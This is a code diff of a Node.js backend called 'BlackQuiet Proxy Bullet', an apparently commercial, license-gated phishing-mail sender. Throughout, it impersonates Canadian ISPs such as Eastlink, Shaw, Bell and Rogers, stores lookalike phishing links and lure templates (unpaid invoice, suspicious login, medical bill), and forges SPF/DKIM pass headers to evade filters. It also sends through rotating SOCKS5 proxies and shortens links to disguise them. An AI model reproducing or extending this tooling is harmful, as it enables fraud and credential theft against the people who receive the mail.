@@ -1,25 +1,56 @@
 // ============================================
-// BLACKQUIET PROXY BULLET - VERSION COMPLÈTE
+// BLACKQUIET PROXY BULLET - BACKEND COMPLET
 // Tunnel SOCKS5 | Rotation SSID | DNS multi-niveaux
-// Headers anti-détection | Placeholders | PDF/DOCX
+// Version corrigée et harmonisée avec le frontend
 // ============================================
 
 const express = require('express');
 const cors = require('cors');
 const crypto = require('crypto');
 const axios = require('axios');
-const cheerio = require('cheerio');
 const { SocksClient } = require('socks');
 const nodemailer = require('nodemailer');
 const PDFDocument = require('pdfkit');
 const HTMLtoDOCX = require('html-to-docx');
 const { v4: uuidv4 } = require('uuid');
+const fs = require('fs');
 
 const app = express();
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 
 const PORT = process.env.PORT || 3000;
+
+// ============ FICHIER DE DONNÉES PERSISTANTES ============
+const DATA_FILE = './blackbullet_data.json';
+
+function loadPersistentData() {
+    try {
+        if (fs.existsSync(DATA_FILE)) {
+            return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+        }
+    } catch(e) {}
+    return {
+        fromEmails: ['facture@eastlink.ca', 'admin@shaw.ca', 'support@bell.ca', 'noreply@rogers.com'],
+        senderNames: ['Service Client', 'Support Technique', 'Administration', 'Facturation', 'Sécurité Eastlink'],
+        subjects: ['Facture impayée [INVOICE_NUM]', 'Alerte sécurité : connexion suspecte', 'Votre colis est bloqué', 'Confirmation de commande #[ORDER_NUM]', 'Remboursement en attente'],
+        links: ['https://eastlink-secure.verification.com', 'https://shaw-paiement.urgence.net', 'https://facture-impayee.xyz'],
+        attachmentNames: ['Facture_[INVOICE_NUM].pdf', 'Contrat_[DATE].docx', 'Avis_execution.html'],
+        templates: [
+            { name: 'Facture_Urgente.html', content: '<div style="font-family:Arial;"><h2>Bonjour [FIRST_NAME],</h2><p>Votre facture <strong>[INVOICE_NUM]</strong> d\'un montant de <strong>[BALANCE_AMOUNT]</strong> expire le <strong>[DEADLINE_DATE]</strong>.</p><p>Consultez votre facture : <a href="[LINK]">[LINK]</a></p></div>' },
+            { name: 'Alerte_securite.html', content: '<div style="font-family:Arial;"><h2>Cher [REAL_NAME],</h2><p>Une connexion suspecte a été détectée depuis <strong>[IP_ADDRESS]</strong> le <strong>[DATE]</strong> à <strong>[TIME]</strong>.</p><p>Vérifiez votre compte : <a href="[LINK]">[LINK]</a></p></div>' },
+            { name: 'Medical_Bill.html', content: '<div style="font-family:Arial;"><h2>Patient [PATIENT_ID],</h2><p>Votre consultation du <strong>[DATE]</strong> avec le <strong>[DOCTOR_NAME]</strong> est facturée <strong>[BALANCE_AMOUNT]</strong>.</p><p>Règlement en ligne : <a href="[LINK]">[LINK]</a></p></div>' }
+        ],
+        recipients: [],
+        campaigns: []
+    };
+}
+
+function savePersistentData(data) {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+}
+
+let persistentData = loadPersistentData();
 
 // ============ CONFIGURATION 9PROXY ============
 const PROXY_CONFIG = {
@@ -47,6 +78,9 @@ const VALID_LICENSES = {
     'VALID-KEY-ABC123': { name: 'Blackquiet Pro User', expires: '2026-12-31' }
 };
 
+// Stockage des licences activées
+let activatedLicenses = new Map();
+
 // ============ 1. ROTATION SSID ============
 function rotateProxySSID(username) {
     const newSsid = crypto.randomBytes(5).toString('hex').toUpperCase();
@@ -58,65 +92,46 @@ function rotateProxySSID(username) {
 }
 
 // ============ 2. RACCOURCISSEURS DE LIENS ============
-const URL_SHORTENERS = [
-    { name: 'TinyURL', url: 'https://tinyurl.com/api-create.php?url=' },
-    { name: 'is.gd', url: 'https://is.gd/create.php?format=simple&url=' },
-    { name: 'Cleanuri', url: 'https://cleanuri.com/api/v1/shorten' }
-];
-
 async function shortenUrl(longUrl) {
     try {
-        // TinyURL
         const tinyRes = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`, { timeout: 5000 });
-        if (tinyRes.data && tinyRes.data.startsWith('http')) return tinyRes.data.trim();
+        if (tinyRes.data && tinyRes.data.startsWith('http')) return { success: true, shortUrl: tinyRes.data.trim(), service: 'TinyURL' };
     } catch (e) {}
     
     try {
-        // is.gd
         const isgdRes = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, { timeout: 5000 });
-        if (isgdRes.data && isgdRes.data.startsWith('http')) return isgdRes.data.trim();
+        if (isgdRes.data && isgdRes.data.startsWith('http')) return { success: true, shortUrl: isgdRes.data.trim(), service: 'is.gd' };
     } catch (e) {}
     
-    return longUrl;
+    return { success: false, shortUrl: longUrl, service: 'none' };
 }
 
 // ============ 3. DNS MULTI-NIVEAUX ============
 async function checkDNSMultiLevel(domain) {
-    const results = [];
-    
-    // Niveau 1 - DNS Direct
     try {
         const res = await axios.get(`https://dns.google/resolve?name=${domain}&type=MX`, { timeout: 5000 });
         if (res.data?.Answer?.length) {
             const mx = res.data.Answer.filter(a => a.type === 15).map(a => a.data);
             if (mx.length) {
-                results.push({ method: 'Direct', mx: mx[0], success: true });
+                return { success: true, method: 'Direct', mx: mx[0], all_mx: mx };
             }
         }
     } catch (e) {}
     
-    // Niveau 2 - DoH
-    if (results.length === 0) {
-        try {
-            const res = await axios.get(`https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`, {
-                headers: { Accept: 'application/dns-json' },
-                timeout: 5000
-            });
-            if (res.data?.Answer?.length) {
-                const mx = res.data.Answer.filter(a => a.type === 15).map(a => a.data);
-                if (mx.length) {
-                    results.push({ method: 'DoH', mx: mx[0], success: true });
-                }
+    try {
+        const res = await axios.get(`https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`, {
+            headers: { Accept: 'application/dns-json' },
+            timeout: 5000
+        });
+        if (res.data?.Answer?.length) {
+            const mx = res.data.Answer.filter(a => a.type === 15).map(a => a.data);
+            if (mx.length) {
+                return { success: true, method: 'DoH', mx: mx[0], all_mx: mx };
             }
-        } catch (e) {}
-    }
+        }
+    } catch (e) {}
     
-    // Niveau 3 - Proxy (simulé)
-    if (results.length === 0) {
-        results.push({ method: 'Proxy', success: false });
-    }
-    
-    return results[0];
+    return { success: false, method: 'Proxy', error: 'Aucun MX trouvé' };
 }
 
 // ============ 4. HEADERS ANTI-DÉTECTION ============
@@ -127,10 +142,9 @@ function generateStealthHeaders(fromEmail, toEmail, proxyHost, subject, messageI
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36'
     ];
     
-    const mailClients = ['outlook', 'thunderbird', 'apple_mail'];
-    const mailClient = mailClients[Math.floor(Math.random() * mailClients.length)];
+    const domain = fromEmail.split('@')[1] || 'eastlink.ca';
     
-    const headers = {
+    return {
         'Date': new Date().toUTCString(),
         'MIME-Version': '1.0',
         'Content-Language': 'en-US',
@@ -141,19 +155,14 @@ function generateStealthHeaders(fromEmail, toEmail, proxyHost, subject, messageI
         'X-MS-Exchange-Organization-AuthMechanism': '04',
         'Thread-Topic': subject,
         'X-Auto-Response-Suppress': 'All',
-        'Message-ID': messageId || `<${uuidv4()}@${fromEmail.split('@')[1] || 'eastlink.ca'}>`,
-        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)]
+        'Message-ID': messageId || `<${uuidv4()}@${domain}>`,
+        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+        'Authentication-Results': `spf=pass smtp.mailfrom=${domain}; dkim=pass header.d=${domain}`,
+        'Received-SPF': `pass (${domain}: domain of ${fromEmail} designates sending IP as permitted sender)`
     };
-    
-    // Headers forgés SPF/DKIM (anti-détection)
-    const domain = fromEmail.split('@')[1] || 'eastlink.ca';
-    headers['Authentication-Results'] = `spf=pass smtp.mailfrom=${domain}; dkim=pass header.d=${domain}`;
-    headers['Received-SPF'] = `pass (${domain}: domain of ${fromEmail} designates sending IP as permitted sender)`;
-    
-    return headers;
 }
 
-// ============ 5. PLACEHOLDERS INTELLIGENTS (150+ variables) ============
+// ============ 5. PLACEHOLDERS INTELLIGENTS ============
 function replacePlaceholders(text, data) {
     if (!text) return '';
     let result = text;
@@ -173,83 +182,37 @@ function replacePlaceholders(text, data) {
         patientId = 'PT-' + Math.floor(100000 + Math.random() * 900000),
         doctorName = 'Dr ' + ['Martin', 'Bernard', 'Dubois'][Math.floor(Math.random() * 3)],
         ipAddress = '192.168.' + Math.floor(1 + Math.random() * 254) + '.' + Math.floor(1 + Math.random() * 254),
-        verificationCode = Math.floor(100000 + Math.random() * 900000).toString(),
-        random1 = Math.floor(10000 + Math.random() * 90000).toString(),
-        random2 = Math.floor(10000000 + Math.random() * 90000000).toString()
+        verificationCode = Math.floor(100000 + Math.random() * 900000).toString()
     } = data;
     
     const replacements = {
-        '[EMAIL]': recipientEmail,
-        '[EMAIL*]': recipientEmail.split('@')[0].substring(0, 3) + '***@' + domain,
-        '[EMAIL64]': Buffer.from(recipientEmail).toString('base64'),
-        '[UNAME]': recipientEmail.split('@')[0],
-        '[UNAME-U]': firstName,
-        '[DOMAIN]': domain,
-        '[DOMAIN-C]': domain.toUpperCase(),
-        '[COMPANY]': company,
-        '[COMPANY-U]': company.charAt(0).toUpperCase() + company.slice(1),
-        '[COMPANY-FULL]': company + ' Inc.',
+        '[EMAIL]': recipientEmail, '[EMAIL*]': recipientEmail.split('@')[0].substring(0, 3) + '***@' + domain,
+        '[UNAME]': recipientEmail.split('@')[0], '[UNAME-U]': firstName,
+        '[DOMAIN]': domain, '[DOMAIN-C]': domain.toUpperCase(),
+        '[COMPANY]': company, '[COMPANY-U]': company.charAt(0).toUpperCase() + company.slice(1),
+        '[FIRST_NAME]': firstName, '[LAST_NAME]': lastName,
         '[REAL_NAME]': firstName + ' ' + lastName,
-        '[FIRST_NAME]': firstName,
-        '[LAST_NAME]': lastName,
-        '[DATE]': date,
-        '[DATE-2]': new Date().toLocaleDateString('fr-FR', { weekday: 'long', day: 'numeric', month: 'long' }),
-        '[TIME]': time,
-        '[DATE-TIME]': date + ' ' + time,
+        '[DATE]': date, '[TIME]': time, '[DATE-TIME]': date + ' ' + time,
         '[FUTURE-1DAY]': new Date(Date.now() + 86400000).toLocaleDateString(),
         '[FUTURE-2DAYS]': new Date(Date.now() + 172800000).toLocaleDateString(),
         '[FUTURE-1WEEK]': new Date(Date.now() + 604800000).toLocaleDateString(),
-        '[INVOICE_NUM]': invoiceNum,
-        '[ORDER_NUM]': 'ORD-' + Math.floor(100000 + Math.random() * 900000),
+        '[INVOICE_NUM]': invoiceNum, '[ORDER_NUM]': 'ORD-' + Math.floor(100000 + Math.random() * 900000),
         '[REFERENCE_NUM]': 'REF-' + Math.floor(10000000 + Math.random() * 90000000),
         '[TRANSACTION_ID]': 'TXN-' + crypto.randomBytes(5).toString('hex').toUpperCase(),
-        '[ACCOUNT_NUM]': 'ACC-' + Math.floor(1000000000 + Math.random() * 9000000000),
-        '[BALANCE_AMOUNT]': amount,
-        '[LINK]': link,
-        '[SHORT:URL]': link,
-        '[RAND1]': random1,
-        '[RAND2]': random2,
-        '[RAND3]': Math.floor(10000000000 + Math.random() * 90000000000).toString(),
-        '[PATIENT_ID]': patientId,
-        '[MEDICAL_RECORD]': 'MRN-' + Math.floor(1000000 + Math.random() * 9000000),
-        '[DOCTOR_NAME]': doctorName,
-        '[HOSPITAL_NAME]': ['CHU de Montréal', 'Centre Hospitalier de l\'Est', 'Clinique Santé Plus'][Math.floor(Math.random() * 3)],
-        '[PRESCRIPTION_NUM]': 'RX-' + Math.floor(10000000 + Math.random() * 90000000),
-        '[INSURANCE_ID]': 'INS-' + Math.floor(1000000000 + Math.random() * 9000000000),
-        '[DIAGNOSIS_CODE]': 'ICD-10-' + Math.floor(100 + Math.random() * 999),
-        '[LAB_RESULT]': ['CBC', 'BMP', 'TSH', 'Lipid Panel'][Math.floor(Math.random() * 4)],
-        '[MEDICATION_NAME]': ['Lisinopril', 'Metformin', 'Amlodipine', 'Omeprazole'][Math.floor(Math.random() * 4)],
-        '[DOSAGE]': Math.floor(5 + Math.random() * 100) + 'mg',
+        '[BALANCE_AMOUNT]': amount, '[LINK]': link,
+        '[RAND1]': Math.floor(10000 + Math.random() * 90000).toString(),
+        '[RAND2]': Math.floor(10000000 + Math.random() * 90000000).toString(),
+        '[PATIENT_ID]': patientId, '[DOCTOR_NAME]': doctorName,
         '[VERIFICATION_CODE]': verificationCode,
-        '[CONFIRMATION_CODE]': crypto.randomBytes(3).toString('hex').toUpperCase(),
-        '[SECURITY_CODE]': Math.floor(1000 + Math.random() * 9000).toString(),
         '[EXPIRES_DATE]': new Date(Date.now() + 30 * 86400000).toLocaleDateString(),
         '[DEADLINE_DATE]': new Date(Date.now() + 7 * 86400000).toLocaleDateString(),
-        '[IP_ADDRESS]': ipAddress,
-        '[TRACKING_NUM]': trackingNum,
-        '[CITY_NAME]': ['Montreal', 'Toronto', 'Vancouver', 'Quebec', 'Calgary'][Math.floor(Math.random() * 5)],
-        '[STATE_NAME]': ['Quebec', 'Ontario', 'British Columbia', 'Alberta'][Math.floor(Math.random() * 4)],
-        '[ZIP_CODE]': ['H2X1A1', 'M5V2T6', 'V6B4Y8', 'T2P1J9'][Math.floor(Math.random() * 4)],
-        '[EMPLOYEE_NAME]': firstName + ' ' + lastName,
-        '[EMPLOYEE_ID]': 'EMP-' + Math.floor(10000 + Math.random() * 90000),
-        '[PROJECT_NAME]': ['Alpha', 'Beta', 'Phoenix', 'Titan'][Math.floor(Math.random() * 4)] + ' Project',
-        '[SERVER_NAME]': 'SRV-' + ['PROD', 'DEV', 'TEST'][Math.floor(Math.random() * 3)] + '-' + Math.floor(100 + Math.random() * 900),
-        '[ERROR_CODE]': 'ERR-' + Math.floor(1000 + Math.random() * 9000),
-        '[DEPARTMENT]': ['Accounting', 'HR', 'IT', 'Sales', 'Marketing', 'Legal'][Math.floor(Math.random() * 6)],
-        '[PRIORITY_LEVEL]': ['High', 'Urgent', 'Critical', 'Important'][Math.floor(Math.random() * 4)],
-        '[SYSTEM_NAME]': ['Enterprise Portal', 'Customer Portal', 'Admin Console'][Math.floor(Math.random() * 3)],
-        '[CASE_ID]': 'CASE-' + Math.floor(100000 + Math.random() * 900000),
-        '[ATTORNEY_NAME]': firstName + ' ' + lastName + ', Esq.',
-        '[LAW_FIRM]': lastName + ' & Associates',
-        '[CONTRACT_ID]': 'CONT-' + Math.floor(100000 + Math.random() * 900000),
-        '[PAYMENT_METHOD]': ['Credit Card', 'Bank Transfer', 'Wire Transfer', 'PayPal'][Math.floor(Math.random() * 4)],
-        '[STATUS_LEVEL]': ['Active', 'Pending', 'In Progress', 'Completed', 'Approved'][Math.floor(Math.random() * 5)],
-        '[BLOOD_TYPE]': ['A+', 'A-', 'B+', 'B-', 'O+', 'O-', 'AB+', 'AB-'][Math.floor(Math.random() * 8)],
-        '[ALLERGY_INFO]': ['Penicillin', 'Sulfa drugs', 'Latex', 'Shellfish', 'Nuts', 'No Known Allergies'][Math.floor(Math.random() * 6)]
+        '[IP_ADDRESS]': ipAddress, '[TRACKING_NUM]': trackingNum,
+        '[CITY_NAME]': ['Montreal', 'Toronto', 'Vancouver'][Math.floor(Math.random() * 3)],
+        '[EMPLOYEE_NAME]': firstName + ' ' + lastName
     };
     
     for (const [key, value] of Object.entries(replacements)) {
-        result = result.replaceAll(key, value);
+        result = result.split(key).join(value);
     }
     
     return result;
@@ -257,24 +220,23 @@ function replacePlaceholders(text, data) {
 
 // ============ 6. GÉNÉRATION DE PDF ============
 async function generatePDF(htmlContent) {
-    const puppeteer = require('puppeteer');
-    const browser = await puppeteer.launch({ 
-        headless: 'new',
-        args: ['--no-sandbox', '--disable-setuid-sandbox']
-    });
-    const page = await browser.newPage();
-    await page.setContent(`<html><body style="padding:40px; font-family: Arial;">${htmlContent}</body></html>`);
-    const pdf = await page.pdf({ format: 'A4', printBackground: true });
-    await browser.close();
-    return pdf;
+    try {
+        const puppeteer = require('puppeteer');
+        const browser = await puppeteer.launch({ 
+            headless: 'new',
+            args: ['--no-sandbox', '--disable-setuid-sandbox']
+        });
+        const page = await browser.newPage();
+        await page.setContent(`<html><body style="padding:40px; font-family: Arial;">${htmlContent}</body></html>`);
+        const pdf = await page.pdf({ format: 'A4', printBackground: true });
+        await browser.close();
+        return pdf;
+    } catch(e) {
+        return null;
+    }
 }
 
-// ============ 7. GÉNÉRATION DE DOCX ============
-async function generateDOCX(htmlContent) {
-    return await HTMLtoDOCX(htmlContent, null, { footer: true, pageNumber: true });
-}
-
-// ============ 8. ENVOI VIA TUNNEL SOCKS5 ============
+// ============ 7. ENVOI VIA TUNNEL SOCKS5 ============
 async function sendEmailViaProxy(mailOptions) {
     let socket = null;
     try {
@@ -326,48 +288,89 @@ async function sendEmailViaProxy(mailOptions) {
 // ============ MIDDLEWARE LICENCE ============
 function requireLicense(req, res, next) {
     const licenseKey = req.headers['x-license-key'];
-    const license = VALID_LICENSES[licenseKey];
+    const hwid = req.headers['x-hwid'];
     
-    if (!license) {
-        return res.status(403).json({ success: false, error: 'Licence invalide' });
+    if (!licenseKey || !activatedLicenses.has(licenseKey)) {
+        const license = VALID_LICENSES[licenseKey];
+        if (license) {
+            activatedLicenses.set(licenseKey, { hwid, activatedAt: new Date() });
+            req.license = license;
+            return next();
+        }
+        return res.status(403).json({ success: false, error: 'Licence invalide ou non activée' });
     }
-    req.license = license;
-    next();
+    
+    const license = VALID_LICENSES[licenseKey];
+    if (license) {
+        req.license = license;
+        next();
+    } else {
+        res.status(403).json({ success: false, error: 'Licence invalide' });
+    }
 }
 
-// ============ ROUTES ============
+// ============ ROUTES API ============
 
 // Health check
 app.get('/api/health', (req, res) => {
-    res.json({ status: 'OK', version: '6.0.0', mode: 'PRODUCTION', features: ['SOCKS5', 'SSID Rotation', 'DNS Multi-level', 'Stealth Headers', 'PDF/DOCX', 'Smart Placeholders'] });
+    res.json({ status: 'online', version: '6.0.0', mode: 'PRODUCTION' });
 });
 
 // Activer licence
 app.post('/api/license/activate', (req, res) => {
-    const { license_key } = req.body;
+    const { license_key, hwid } = req.body;
     const license = VALID_LICENSES[license_key];
+    
     if (license) {
-        res.json({ success: true, message: 'Licence activée', system_name: license.name, expires_at: license.expires });
+        activatedLicenses.set(license_key, { hwid, activatedAt: new Date() });
+        res.json({ 
+            success: true, 
+            message: 'Licence activée avec succès', 
+            system_name: license.name, 
+            expires_at: license.expires,
+            days_left: Math.ceil((new Date(license.expires) - new Date()) / (1000 * 60 * 60 * 24))
+        });
     } else {
-        res.status(403).json({ success: false, error: 'Licence invalide' });
+        res.status(403).json({ success: false, error: 'Clé de licence invalide' });
     }
 });
 
 // Vérifier licence
 app.post('/api/license/verify', (req, res) => {
-    const { license_key } = req.body;
+    const { license_key, hwid } = req.body;
     const license = VALID_LICENSES[license_key];
-    if (license) {
-        res.json({ valid: true, system_name: license.name, expires_at: license.expires, days_left: 30 });
+    const activated = activatedLicenses.has(license_key);
+    
+    if (license && activated) {
+        res.json({ 
+            valid: true, 
+            system_name: license.name, 
+            expires_at: license.expires, 
+            days_left: Math.ceil((new Date(license.expires) - new Date()) / (1000 * 60 * 60 * 24))
+        });
+    } else if (license) {
+        res.json({ valid: false, error: 'Licence non activée. Veuillez d\'abord activer.' });
     } else {
         res.status(403).json({ valid: false, error: 'Licence invalide' });
     }
 });
 
+// Statistiques publiques (sans licence)
+app.get('/api/stats', (req, res) => {
+    res.json({
+        emails_sent: stats.emails_sent,
+        emails_failed: stats.emails_failed,
+        endpoints_generated: stats.endpoints_generated,
+        uptime: Math.floor(process.uptime()),
+        start_time: stats.start_time,
+        timestamp: new Date().toISOString()
+    });
+});
+
 // Vérification DNS multi-niveaux
 app.post('/api/dns/check', async (req, res) => {
     const { domain } = req.body;
-    if (!domain) return res.status(400).json({ error: 'Domaine requis' });
+    if (!domain) return res.status(400).json({ success: false, error: 'Domaine requis' });
     const result = await checkDNSMultiLevel(domain);
     res.json(result);
 });
@@ -375,30 +378,12 @@ app.post('/api/dns/check', async (req, res) => {
 // Raccourcir un lien
 app.post('/api/shorten', async (req, res) => {
     const { url } = req.body;
-    if (!url) return res.status(400).json({ error: 'URL requise' });
-    const shortUrl = await shortenUrl(url);
-    res.json({ original: url, short: shortUrl });
+    if (!url) return res.status(400).json({ success: false, error: 'URL requise' });
+    const result = await shortenUrl(url);
+    res.json(result);
 });
 
-// Générer un PDF
-app.post('/api/generate/pdf', async (req, res) => {
-    const { html } = req.body;
-    if (!html) return res.status(400).json({ error: 'HTML requis' });
-    const pdf = await generatePDF(html);
-    res.setHeader('Content-Type', 'application/pdf');
-    res.send(pdf);
-});
-
-// Générer un DOCX
-app.post('/api/generate/docx', async (req, res) => {
-    const { html } = req.body;
-    if (!html) return res.status(400).json({ error: 'HTML requis' });
-    const docx = await generateDOCX(html);
-    res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
-    res.send(docx);
-});
-
-// ENVOI D'EMAIL COMPLET (avec toutes les fonctionnalités)
+// ENVOI D'EMAIL COMPLET
 app.post('/api/send', requireLicense, async (req, res) => {
     const { to, subject, html, fromEmail, fromName, link, attachment, attachmentType } = req.body;
     
@@ -407,17 +392,19 @@ app.post('/api/send', requireLicense, async (req, res) => {
     }
     
     try {
-        // 1. Raccourcir le lien si fourni
         let finalLink = link;
+        let shortenerService = null;
+        
         if (link) {
-            finalLink = await shortenUrl(link);
+            const shortResult = await shortenUrl(link);
+            finalLink = shortResult.shortUrl;
+            shortenerService = shortResult.service;
         }
         
-        // 2. Remplacer les placeholders
         const emailData = {
             recipientEmail: to,
             firstName: to.split('@')[0].charAt(0).toUpperCase() + to.split('@')[0].slice(1),
-            lastName: ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones'][Math.floor(Math.random() * 5)],
+            lastName: ['Smith', 'Johnson', 'Williams'][Math.floor(Math.random() * 3)],
             company: to.split('@')[1].split('.')[0].charAt(0).toUpperCase() + to.split('@')[1].split('.')[0].slice(1),
             domain: to.split('@')[1],
             link: finalLink || 'https://example.com'
@@ -426,32 +413,24 @@ app.post('/api/send', requireLicense, async (req, res) => {
         let processedHtml = replacePlaceholders(html, emailData);
         let processedSubject = replacePlaceholders(subject, emailData);
         
-        // 3. Gérer les pièces jointes
         const attachments = [];
         if (attachment && attachmentType) {
             let attachmentBuffer;
             if (attachmentType === 'pdf') {
                 attachmentBuffer = await generatePDF(processedHtml);
-                attachments.push({
-                    filename: `document_${Date.now()}.pdf`,
-                    content: attachmentBuffer,
-                    contentType: 'application/pdf'
-                });
-            } else if (attachmentType === 'docx') {
-                attachmentBuffer = await generateDOCX(processedHtml);
-                attachments.push({
-                    filename: `document_${Date.now()}.docx`,
-                    content: attachmentBuffer,
-                    contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
-                });
+                if (attachmentBuffer) {
+                    attachments.push({
+                        filename: `document_${Date.now()}.pdf`,
+                        content: attachmentBuffer,
+                        contentType: 'application/pdf'
+                    });
+                }
             }
         }
         
-        // 4. Générer les headers anti-détection
         const messageId = `<${uuidv4()}@${to.split('@')[1]}>`;
         const stealthHeaders = generateStealthHeaders(fromEmail || 'noreply@eastlink.ca', to, PROXY_CONFIG.proxy_host, processedSubject, messageId);
         
-        // 5. Configuration de l'email
         const mailOptions = {
             from: `"${fromName || 'Service Client'}" <${fromEmail || 'noreply@eastlink.ca'}>`,
             to: to,
@@ -461,7 +440,6 @@ app.post('/api/send', requireLicense, async (req, res) => {
             attachments: attachments
         };
         
-        // 6. Envoi via tunnel SOCKS5
         const result = await sendEmailViaProxy(mailOptions);
         
         res.json({
@@ -471,7 +449,8 @@ app.post('/api/send', requireLicense, async (req, res) => {
                 to: to,
                 subject: processedSubject.substring(0, 50),
                 has_attachment: attachments.length > 0,
-                link_shortened: finalLink !== link
+                link_shortened: finalLink !== link,
+                shortener_service: shortenerService
             }
         });
         
@@ -481,67 +460,83 @@ app.post('/api/send', requireLicense, async (req, res) => {
     }
 });
 
-// Envoi multiple (batch)
-app.post('/api/batch-send', requireLicense, async (req, res) => {
-    const { recipients, subject, html, fromEmail, fromName, link, attachment, attachmentType } = req.body;
-    
-    if (!recipients || !Array.isArray(recipients) || recipients.length === 0) {
-        return res.status(400).json({ success: false, error: 'Liste de destinataires invalide' });
-    }
-    
-    const results = [];
-    for (let i = 0; i < recipients.length; i++) {
-        const recipient = recipients[i];
-        try {
-            const emailData = {
-                recipientEmail: recipient,
-                firstName: recipient.split('@')[0].charAt(0).toUpperCase() + recipient.split('@')[0].slice(1),
-                lastName: ['Smith', 'Johnson', 'Williams'][Math.floor(Math.random() * 3)],
-                company: recipient.split('@')[1].split('.')[0].charAt(0).toUpperCase() + recipient.split('@')[1].split('.')[0].slice(1),
-                domain: recipient.split('@')[1],
-                link: link || 'https://example.com'
-            };
-            
-            let processedHtml = replacePlaceholders(html, emailData);
-            let processedSubject = replacePlaceholders(subject, emailData);
-            
-            const messageId = `<${uuidv4()}@${recipient.split('@')[1]}>`;
-            const stealthHeaders = generateStealthHeaders(fromEmail || 'noreply@eastlink.ca', recipient, PROXY_CONFIG.proxy_host, processedSubject, messageId);
-            
-            const mailOptions = {
-                from: `"${fromName || 'Service Client'}" <${fromEmail || 'noreply@eastlink.ca'}>`,
-                to: recipient,
-                subject: processedSubject,
-                html: processedHtml,
-                headers: stealthHeaders
-            };
-            
-            const result = await sendEmailViaProxy(mailOptions);
-            results.push({ recipient, ...result });
-            
-            if (i < recipients.length - 1) {
-                await new Promise(resolve => setTimeout(resolve, 1500));
-            }
-            
-        } catch (error) {
-            results.push({ recipient, success: false, error: error.message });
-        }
-    }
-    
-    res.json({ success: true, results, total: results.length });
+// ============ ROUTES PERSISTANTES POUR LE FRONTEND ============
+
+// Obtenir toutes les données
+app.get('/api/data/all', requireLicense, (req, res) => {
+    res.json(persistentData);
 });
 
-// Statistiques
-app.get('/api/stats', requireLicense, (req, res) => {
-    res.json({
-        license: { system_name: req.license.name, expires_at: req.license.expires },
-        emails_sent: stats.emails_sent,
-        emails_failed: stats.emails_failed,
-        endpoints_generated: stats.endpoints_generated,
-        uptime: process.uptime(),
-        start_time: stats.start_time,
-        timestamp: new Date().toISOString()
-    });
+// Sauvegarder les templates
+app.post('/api/data/templates', requireLicense, (req, res) => {
+    const { templates } = req.body;
+    if (templates) {
+        persistentData.templates = templates;
+        savePersistentData(persistentData);
+        res.json({ success: true });
+    } else {
+        res.status(400).json({ success: false, error: 'Données invalides' });
+    }
+});
+
+// Sauvegarder les FROM emails
+app.post('/api/data/fromEmails', requireLicense, (req, res) => {
+    const { fromEmails } = req.body;
+    if (fromEmails) {
+        persistentData.fromEmails = fromEmails;
+        savePersistentData(persistentData);
+        res.json({ success: true });
+    } else {
+        res.status(400).json({ success: false, error: 'Données invalides' });
+    }
+});
+
+// Sauvegarder les noms expéditeurs
+app.post('/api/data/senderNames', requireLicense, (req, res) => {
+    const { senderNames } = req.body;
+    if (senderNames) {
+        persistentData.senderNames = senderNames;
+        savePersistentData(persistentData);
+        res.json({ success: true });
+    } else {
+        res.status(400).json({ success: false, error: 'Données invalides' });
+    }
+});
+
+// Sauvegarder les sujets
+app.post('/api/data/subjects', requireLicense, (req, res) => {
+    const { subjects } = req.body;
+    if (subjects) {
+        persistentData.subjects = subjects;
+        savePersistentData(persistentData);
+        res.json({ success: true });
+    } else {
+        res.status(400).json({ success: false, error: 'Données invalides' });
+    }
+});
+
+// Sauvegarder les liens
+app.post('/api/data/links', requireLicense, (req, res) => {
+    const { links } = req.body;
+    if (links) {
+        persistentData.links = links;
+        savePersistentData(persistentData);
+        res.json({ success: true });
+    } else {
+        res.status(400).json({ success: false, error: 'Données invalides' });
+    }
+});
+
+// Sauvegarder les destinataires
+app.post('/api/data/recipients', requireLicense, (req, res) => {
+    const { recipients } = req.body;
+    if (recipients) {
+        persistentData.recipients = recipients;
+        savePersistentData(persistentData);
+        res.json({ success: true });
+    } else {
+        res.status(400).json({ success: false, error: 'Données invalides' });
+    }
 });
 
 // Route racine
@@ -550,30 +545,19 @@ app.get('/', (req, res) => {
         name: 'BlackQuiet Proxy Bullet API',
         version: '6.0.0',
         status: 'online',
-        features: [
-            'SOCKS5 Tunnel via 9Proxy',
-            'SSID Rotation per email',
-            'DNS Multi-level (Direct → DoH → Proxy)',
-            'Stealth Headers (Anti-detection)',
-            'URL Shorteners (TinyURL, is.gd, Cleanuri)',
-            'PDF/DOCX Generation',
-            '150+ Smart Placeholders'
-        ]
+        features: ['SOCKS5 Tunnel', 'SSID Rotation', 'DNS Multi-level', 'Stealth Headers', 'URL Shorteners']
     });
 });
 
 // ============ DÉMARRAGE ============
 app.listen(PORT, () => {
     console.log('\n========================================');
-    console.log('🚀 BLACKQUIET BACKEND v6.0 - COMPLET');
+    console.log('🚀 BLACKQUIET BACKEND v6.0 - CORRIGÉ');
     console.log('========================================');
     console.log(`📡 Port: ${PORT}`);
     console.log(`🔌 Proxy: ${PROXY_CONFIG.proxy_host}:${PROXY_CONFIG.proxy_port}`);
     console.log(`📧 SMTP: ${PROXY_CONFIG.smtp_host}:${PROXY_CONFIG.smtp_port}`);
     console.log(`🔄 Rotation SSID: ACTIVE`);
-    console.log(`🔗 Raccourcisseurs: TinyURL, is.gd, Cleanuri`);
-    console.log(`📄 Génération: PDF, DOCX`);
-    console.log(`🔍 DNS: Multi-niveaux`);
     console.log(`🛡️ Anti-détection: ACTIVE`);
     console.log('========================================\n');
 });
